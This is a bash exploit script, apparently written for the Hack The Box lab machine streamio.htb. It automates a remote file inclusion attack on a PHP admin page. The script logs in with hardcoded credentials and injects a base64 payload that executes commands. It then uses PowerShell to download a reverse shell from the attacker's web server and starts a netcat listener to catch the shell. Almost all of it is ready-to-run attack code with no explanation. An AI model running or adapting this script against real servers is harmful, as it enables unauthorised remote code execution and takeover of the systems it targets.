### RFI exploitation tool for PHP servers running on Windows ###


# LHOST
lhost=$(hostname -I | awk '{ print $2}') # Change this
echo "[+] Using local IP address $lhost"


# Setting up exploit
## Check if exploit is on machine
if [ ! -f rshell.php ]; then
    echo "[-] File rshell.php not working directory $(pwd)!"
    echo "[] Downloading shell."
    git clone https://github.com/Dhayalanb/windows-php-reverse-shell.git
    cp 'windows-php-reverse-shell/Reverse Shell.php' rshell.php
fi

# Verifying that the exploit is configured
port=$(cat rshell.php | awk -F "[\t;=]" '/port/{print$2; exit}' | sed 's/\"//g')
echo "[+] Using rshell.php with port:$port"


# Login
request=$(curl -i -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'username=yoshihide&password=66boysandgirls..' 'https://streamio.htb/login.php')
session=$(echo $request | grep PHPSESSID | awk -F'[=&;]' '{print $4}')
echo "[+] Got session ID: $session"


# RFI to download your reverse shell
echo "[+] Starting webserver"
qterminal -e python -m http.server 80

curl -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b "PHPSESSID=$session" --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" "https://streamio.htb/admin/?debug=master.php&cmd=powershell.exe+iwr+-uri+$lhost/rshell.php+-outfile+'C:\Downloads\rshell.php'" | grep '<input name="include" hidden>' -A 9999 |grep '</div>' -B 9999 | tail -n +3 | head -n -1


# Call reverse shell
echo "[+] Starting netcat listener"
qterminal -e nc -nlvp $port

curl -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b "PHPSESSID=$session" --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=php.exe+..\..\..\Downloads\rshell.php' | grep '<input name="include" hidden>' -A 9999 |grep '</div>' -B 9999 | tail -n +3 | head -n -1


# Remove environment variables
unset lhost
unset port
unset request
unset session
